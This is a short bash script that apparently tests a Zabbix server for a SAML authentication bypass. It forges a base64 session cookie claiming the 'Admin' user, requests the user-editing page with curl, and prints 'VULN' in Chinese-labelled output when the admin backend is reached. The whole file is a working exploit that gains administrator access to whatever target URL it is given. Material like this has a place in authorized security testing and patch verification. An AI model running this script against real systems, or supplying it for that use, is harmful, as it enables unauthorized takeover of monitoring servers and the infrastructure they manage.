#!/usr/bin/env bash
TARGET="${1:?usage: bash zabbix.sh http://TARGET:8080}"
B="${TARGET%/}"
COOKIE=$(python3 -c 'import base64,json;print(base64.b64encode(json.dumps({"saml_data":{"username_attribute":"Admin"},"sessionid":"0000000000000000"}).encode()).decode())')
echo "cookie=$COOKIE"
curl -sS -m 12 -o runs/zbx.txt -w 'user.edit=%{http_code}\n' \
  -H "Cookie: zbx_session=$COOKIE" "$B/zabbix.php?action=user.edit"
grep -qiE 'Zabbix SIA|用户|Users' runs/zbx.txt && echo "VULN 进入后台页面" || echo "SAFE/需要签名或未启用 SAML"
